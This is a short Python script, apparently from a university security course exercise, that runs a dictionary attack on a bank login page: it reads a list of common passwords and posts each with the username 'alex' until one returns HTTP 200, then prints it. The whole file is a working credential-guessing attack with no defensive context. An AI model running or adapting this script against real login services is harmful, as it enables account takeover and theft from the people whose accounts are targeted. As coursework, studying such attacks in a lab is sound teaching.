import requests

url = "https://bank.csci3403.com/login"
username = "alex"

with open("common_passwords.txt", "r") as f:
    common_passwords = [line.strip() for line in f if line.strip()]

for pwd in common_passwords:
    data = {"username": username, "password": pwd}
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print(pwd)
        break
else:
    print("Not Found")